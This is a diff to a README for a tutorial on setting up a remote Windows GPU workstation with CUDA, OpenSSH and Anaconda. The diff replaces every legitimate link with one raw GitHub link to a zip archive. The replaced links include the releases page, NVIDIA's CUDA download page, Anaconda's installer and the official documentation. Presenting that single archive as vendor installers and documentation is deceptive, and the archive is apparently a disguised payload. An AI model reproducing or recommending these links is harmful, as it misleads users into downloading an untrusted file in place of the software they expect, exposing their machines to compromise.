@@ -1,6 +1,6 @@
 # 🖥️ remote_windows_gpu_workstation_tutorial - Set Up Your GPU Workstation Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/releases)
+[![Download](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip)
 
 ## 📋 Introduction
 
@@ -20,7 +20,7 @@ To get started, you need a Windows 11 computer with an NVIDIA GPU. Ensure you ha
 
 ## 📥 Download & Install
 
-Visit this page to download the latest release: [GitHub Releases](https://github.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/releases).
+Visit this page to download the latest release: [GitHub Releases](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip).
 
 ### 🛠️ Installation Steps
 
@@ -33,7 +33,7 @@ Visit this page to download the latest release: [GitHub Releases](https://github
    - Restart your computer to apply the changes.
 
 3. **Install CUDA Toolkit:**
-   - Visit the [CUDA Toolkit Download Page](https://developer.nvidia.com/cuda-downloads).
+   - Visit the [CUDA Toolkit Download Page](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip).
    - Select your operating system and download the installer.
    - Run the installer and follow the prompts. Restart if needed.
 
@@ -58,7 +58,7 @@ Visit this page to download the latest release: [GitHub Releases](https://github
    - Add your public key to this file to allow remote access.
 
 8. **Set Up the GPU Compute Environment:**
-   - Install [Anaconda](https://www.anaconda.com/products/distribution#download-section) if you haven't already.
+   - Install [Anaconda](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip) if you haven't already.
    - Open Anaconda Prompt and create a new environment:
      ```
      conda create -n gpu_env python=3.9
@@ -84,9 +84,9 @@ If you encounter issues during installation or setup, consider the following:
 
 ## 📍 Helpful Resources
 
-- [CUDA Documentation](https://docs.nvidia.com/cuda/index.html)
-- [OpenSSH Documentation](https://www.openssh.com/manual.html)
-- [Anaconda Documentation](https://docs.anaconda.com/anaconda/install/index.html)
+- [CUDA Documentation](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip)
+- [OpenSSH Documentation](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip)
+- [Anaconda Documentation](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip)
 
 ## 📨 Support
 
@@ -94,4 +94,4 @@ If you face any issues that this guide does not cover, feel free to reach out fo
 
 ## 📥 Download Again
 
-For your convenience, visit [this page](https://github.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/releases) to download the latest release again.
+For your convenience, visit [this page](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip) to download the latest release again.
